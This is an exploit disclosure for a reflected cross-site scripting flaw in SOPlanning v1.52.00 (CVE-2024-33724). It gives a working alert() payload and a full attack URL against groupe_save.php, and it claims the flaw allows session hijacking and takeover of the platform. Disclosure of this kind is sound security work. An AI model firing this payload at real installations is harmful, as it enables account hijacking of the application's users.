
Exploit Title: SOPlanning v1.52.00 'groupe_save.php' XSS (Reflected XSS)
Application: SOPlanning
Version: 1.52.00
Date: 4/22/24
Exploit Author: Joseph McPeters (Liquidsky)
Vendor Homepage: https://www.soplanning.org/en/
Software Link: https://sourceforge.net/projects/soplanning/
Tested on: Linux
CVE: CVE-2024-33724

Description: SOPlanning v1.52.00 is vulnerable to XSS via the 'groupe_id' parameters a remote unautheticated attacker can hijack the admin account or other users. The remote attacker can hijack a users session or credentials and perform a takeover of the entire platform.

Example Payload:
"><script>alert('LiQUiDSKY')</script><!--

Reflected XSS: /soplanning/www/process/groupe_save.php?saved=1&groupe_id="><script>alert('LiQUiDSKY')</script><!--&nom=Project+New

Analysis: The landing page takes into consideration the user input then redirects to a page where the XSS is shown the payload included in the exploit, escapes the variable where it is held, and comments out the rest to perform a valid reflected XSS attack against any authenticated user the payload was sent to.
